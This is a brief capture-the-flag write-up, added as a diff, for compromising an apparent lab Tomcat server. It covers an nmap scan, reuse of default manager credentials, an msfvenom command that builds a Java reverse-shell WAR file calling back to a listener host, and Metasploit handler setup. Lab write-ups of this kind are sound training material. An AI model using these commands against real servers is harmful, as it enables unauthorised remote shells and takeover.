@@ -1,0 +1,22 @@
+#Performed a basic nmap scan 
+
+nmap -p -T4 -A -O 10.10.10.95
+
+#Returned back the port 8080 and port 22
+#straight fire up the website portal it's tomcat try to login in the manager after the incorrect try it showed the credentials within the forum then login back with the credentials.
+
+#we can upload the war file from there so try to find the war file exploits over tomcat for rce
+
+msfvenom -p java/shell_reverse_tcp LHOST=10.10.12.60 LPORT=4444 -f war > jerry.war
+
+#In parallel open metasloit multi handler
+
+msf exploit(multi/handler) > set payload java/shell_reverse_tcp
+
+msf > set LHOST 10.10.12.60
+LHOST => 10.10.12.60
+msf exploit(multi/handler) > run
+
+#After setting up the metasploit we can set upload the war file and access it from the local manager of tomcat 
+#just after accessing we will get the shell from the console ad in meterpreter from the rece there we can find the main file in  Administrator with the name of 2 in 1 sort of something there we have out both flags and we owned the machine.
+
